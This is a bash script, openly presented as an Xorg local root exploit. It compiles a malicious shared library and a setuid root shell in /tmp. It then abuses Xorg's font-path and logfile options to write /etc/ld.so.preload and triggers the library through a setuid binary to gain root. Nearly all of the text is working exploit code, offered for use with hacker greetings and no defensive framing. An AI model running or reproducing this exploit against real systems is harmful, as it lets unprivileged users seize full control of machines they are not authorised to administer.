#!/bin/bash
# x0rg - Xorg Local Root Exploit
# Released under the Snitches Get Stitches Public Licence.
# props to prdelka / fantastic for the shadow vector. 
# Gr33tz to everyone in #lizardhq and elsewhere <3
# ~infodox (25/10/2018)
# FREE LAURI LOVE!
echo "x0rg"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Hack the planet!"
cd /etc; Xorg -fp "/tmp/libhax.so" -logfile ld.so.preload :1;
mount # arbritary setuid we run to pop root
echo "[+] Tidy up a bit..."
rm -f /tmp/libhax.so
echo "[<3] :PPpPpPpOpr000000t!"
/tmp/rootshell
